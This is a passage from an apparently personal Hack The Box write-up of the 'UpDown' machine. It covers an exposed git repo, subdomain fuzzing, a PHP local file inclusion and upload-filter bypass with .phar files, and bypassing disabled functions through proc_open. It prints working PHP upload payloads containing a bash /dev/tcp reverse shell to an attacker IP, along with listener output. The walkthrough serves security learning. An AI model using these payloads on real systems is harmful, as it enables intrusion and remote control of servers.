<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/pre-receive.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/prepare-commit-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/push-to-checkout.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/update.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/heads/main <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/remotes/origin/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/remotes/origin/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/refs/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/refs/heads/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/refs/remotes/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/refs/heads/main <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/refs/remotes/origin/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/logs/refs/remotes/origin/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Running git checkout <span class="nb">.</span>
Updated 6 paths from the index
</pre></td></tr></tbody></table></code></div></div>

<p>This hinted at a possible development site. It did not appear to be in <code class="language-plaintext highlighter-rouge">/dev</code> so I looked for subdomains.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/amass/wordlists/subdomains-top1mil-5000.txt <span class="nt">-t30</span> <span class="nt">--hw</span> 93 <span class="nt">-H</span> <span class="s2">"Host:FUZZ.siteisup.htb"</span> <span class="s2">"http://siteisup.htb/"</span>
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://siteisup.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   403        9 L      28 W       281 Ch      "dev"
000002700:   400        10 L     35 W       301 Ch      "m."
000002795:   400        10 L     35 W       301 Ch      "ns2.cl.bellsouth.net."
000002885:   400        10 L     35 W       301 Ch      "ns2.viviotech.net."
000002883:   400        10 L     35 W       301 Ch      "ns1.viviotech.net."
000003050:   400        10 L     35 W       301 Ch      "ns3.cl.bellsouth.net."
000004083:   400        10 L     35 W       301 Ch      "quatro.oweb.com."
000004082:   400        10 L     35 W       301 Ch      "jordan.fortwayne.com."
000004081:   400        10 L     35 W       301 Ch      "ferrari.fortwayne.com."

Total time: 6.349830
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 787.4226
</span></pre></td></tr></tbody></table></code></div></div>

<p>It found <code class="language-plaintext highlighter-rouge">dev.siteisup.htb</code>, I added that to my hosts files. When I tried to visit it, I got a 403.</p>

<p>I looked at the .htaccess from the source code and saw that the site required a header to be present.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
</pre></td></tr></tbody></table></code></div></div>

<p>I used Burp Proxy Map and Replace to always had that header to my requests.</p>

<p><img data-src="/assets/images/UpDown/BurpAddHeader.png" alt="Burp Add Header" title="Burp Add Header" data-proofer-ignore></p>

<p>I reloaded the page, and this time I got a 200.</p>

<p><img data-src="/assets/images/UpDown/DevSite.png" alt="Dev Site" title="Dev Site" data-proofer-ignore></p>

<p>This site was also checking if websites were online or not. But this one allowed uploading files with a list of sites to check.</p>

<p>There was also an admin panel.</p>

<p><img data-src="/assets/images/UpDown/AdminPanel.png" alt="Admin Panel" title="Admin Panel" data-proofer-ignore></p>

<p>The panel was empty, but the <code class="language-plaintext highlighter-rouge">?page=admin</code> in the URL hinted at <a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/">Local File Inclusion (LFI)</a>.</p>

<p>The source code confirmed it was possible.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
	<span class="nb">define</span><span class="p">(</span><span class="s2">"DIRECTACCESS"</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
	<span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/bin|usr|home|var|etc/i"</span><span class="p">,</span><span class="nv">$page</span><span class="p">)){</span>
		<span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">include</span><span class="p">(</span><span class="s2">"checker.php"</span><span class="p">);</span>
	<span class="p">}</span>	
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>There were some limitations, but I could include PHP files.</p>

<p>I thought that I might be able to use the file upload functionality to upload a PHP file, then execute it with LFI vulnerability. But it was not that simple. The upload had some restrictions on the file extensions, PHP files were rejected. And it was deleting the uploaded files as soon as it was done.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'check'</span><span class="p">]){</span>
  
	<span class="c1"># File size must be less than 10kb.</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10000</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"File too large!"</span><span class="p">);</span>
    <span class="p">}</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
	
	<span class="c1"># Check if extension is allowed.</span>
	<span class="nv">$ext</span> <span class="o">=</span> <span class="nf">getExtension</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i"</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)){</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"Extension not allowed!"</span><span class="p">);</span>
	<span class="p">}</span>
  
	<span class="c1"># Create directory to upload our file.</span>
	<span class="nv">$dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">())</span><span class="mf">.</span><span class="s2">"/"</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0770</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="p">}</span>
  
  <span class="c1"># Upload the file.</span>
	<span class="nv">$final_path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="mf">.</span><span class="nv">$file</span><span class="p">;</span>
	<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$final_path</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
	
  <span class="c1"># Read the uploaded file.</span>
	<span class="nv">$websites</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$final_path</span><span class="p">));</span>
	
	<span class="k">foreach</span><span class="p">(</span><span class="nv">$websites</span> <span class="k">as</span> <span class="nv">$site</span><span class="p">){</span>
		<span class="nv">$site</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#file://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#data://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#ftp://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)){</span>
			<span class="nv">$check</span><span class="o">=</span><span class="nf">isitup</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
			<span class="k">if</span><span class="p">(</span><span class="nv">$check</span><span class="p">){</span>
				<span class="k">echo</span> <span class="s2">"&lt;center&gt;</span><span class="si">{</span><span class="nv">$site</span><span class="si">}</span><span class="s2">&lt;br&gt;&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="k">echo</span> <span class="s2">"&lt;center&gt;</span><span class="si">{</span><span class="nv">$site</span><span class="si">}</span><span class="s2">&lt;br&gt;&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
			<span class="p">}</span>	
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
			<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	
  <span class="c1"># Delete the uploaded file.</span>
	<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$final_path</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It was also uploading files to a different folder every time. Luckily, directory listing was not disabled on the uploads folder, so I did not need to guess the folders where my files were being uploaded. I also did not need to use the LFI to execute PHP code if I were to find a way to upload a PHP file.</p>

<p>The deleting of the file could have been an issue, but I quickly found a way around that.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">isitup</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
	<span class="nv">$ch</span><span class="o">=</span><span class="nb">curl_init</span><span class="p">();</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_USERAGENT</span><span class="p">,</span> <span class="s2">"siteisup.htb beta"</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
	<span class="nv">$f</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
	<span class="nv">$header</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="k">AND</span> <span class="nv">$header</span><span class="p">[</span><span class="s1">'http_code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
		<span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The code was using Curl to check if the websites were up. And it had a 30 seconds timeout. Hack The Box machines do not have access to the internet, so if I tried to check on any sites, it would hang for 30 seconds before deleting the file. I could add more lines if I needed more time.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">dev.siteisup.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------27067171744469957932680288557</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">387</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Special-Dev</span><span class="p">:</span> <span class="s">only4dev</span>

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

https://app.hackthebox.com
https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/images/2023/01/UpDown/PersitedFile.png" alt="Persisted File" title="Persited File" data-proofer-ignore></p>

<p>The code was blocking PHP files. But PHP <a href="https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology">supports many extensions</a>. I found out I could upload <code class="language-plaintext highlighter-rouge">.phar</code> files and they were executed.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">dev.siteisup.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------27067171744469957932680288557</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">384</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Special-Dev</span><span class="p">:</span> <span class="s">only4dev</span>

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

&lt;?php
echo 'RCE&lt;br /&gt;';
?&gt;
https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/images/2023/01/UpDown/RCE.png" alt="RCE" title="RCE" data-proofer-ignore></p>

<p>At this point, I thought I had an easy reverse shell.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">dev.siteisup.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------27067171744469957932680288557</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">428</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Special-Dev</span><span class="p">:</span> <span class="s">only4dev</span>

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

&lt;?php
`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'`;
?&gt;

https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
</pre></td></tr></tbody></table></code></div></div>

<p>I sent a phar file with the reverse shell and opened it, but it failed. I tried different reverse shells, they all failed.</p>

<p>I changed my code to execute <code class="language-plaintext highlighter-rouge">phpinfo()</code>. This showed me why my reverse shells were all failing.</p>

<p><img data-src="/assets/images/2023/01/UpDown/DisabledFunctions.png" alt="Disabled Functions" title="Disabled Functions" data-proofer-ignore></p>

<p>The functions I was using to get the shell were all disabled by PHP configuration. I tried to use <code class="language-plaintext highlighter-rouge">ini_set</code> to enable them. But they cannot be enabled at runtime.</p>

<p>I tried other things, I used PHP to list the files and folders on the machine. I tried reading many files but did not find anything. I tried reading the user’s ssh key but did not have access. I got stuck at this point. I left the machine aside and worked on others for a while.</p>

<h2 id="finally-a-shell"><span class="mr-2">Finally a Shell</span><a href="#finally-a-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>When I came back to this box, I tried to bypass the disabled functions again. I tried a few things I found, but none of them worked.</p>

<p>I came across a <a href="https://github.com/teambi0s/dfunc-bypasser">Python script</a> that took the output of <code class="language-plaintext highlighter-rouge">phpinfo()</code> and checked for functions that are not disabled and can be exploited. The code failed to parse the list of functions. It’s 3 years old and the format might have changed. I hardcoded the list of functions directly in the code and ran it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 dfunc-bypasser.py <span class="nt">--url</span> http://dev.siteisup.htb/uploads/test.php


                                ,---,     
                                  .<span class="s1">'  .'</span> <span class="sb">`</span><span class="se">\ </span>  
                                  ,---.<span class="s1">'     \  
                                  |   |  .`\  | 
                                  :   : |  '</span>  | 
                                  |   <span class="s1">' '</span>  <span class="p">;</span>  : 
                                  <span class="s1">'   | ;  .  | 
                                  |   | :  |  '</span> 
                                  <span class="s1">'   : | /  ;  
                                  |   | '</span><span class="sb">`</span> ,/   
                                  <span class="p">;</span>   :  .<span class="s1">'     
                                  |   ,.'</span>       
                                  <span class="s1">'---'</span>         


                        authors: __c3rb3ru5__, <span class="nv">$_SpyD3r_</span><span class="err">$</span>


Please add the following functions <span class="k">in </span>your disable_functions option: 
proc_open
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">proc_open</code> was not disabled. I found a <a href="https://github.com/Taintedtrickstr/Reverse_Shells/blob/main/PHP_Proc_Open_Reverse_Shell">small script</a> that showed how to exploit it to run commands on the server.</p>

<p>I used it to get a shell on the server.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">dev.siteisup.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------27067171744469957932680288557</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1006</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://dev.siteisup.htb/</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Special-Dev</span><span class="p">:</span> <span class="s">only4dev</span>

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

&lt;?php
$descriptorspec = array(
   0=&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1=&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2=&gt; array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
    fwrite($pipes[0], "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'");
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $return_value = proc_close($process);

     echo "command returned $return_value\n";
}
?&gt;

https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
</pre></td></tr></tbody></table></code></div></div>

<p>I was finally in.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.177] 49620
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>910<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c<span class="nv">$ </span>

www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="getting-user"><span class="mr-2">Getting User</span><a href="#getting-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once I got in the machine, I looked for files with the <code class="language-plaintext highlighter-rouge">suid</code> bit set.</p>
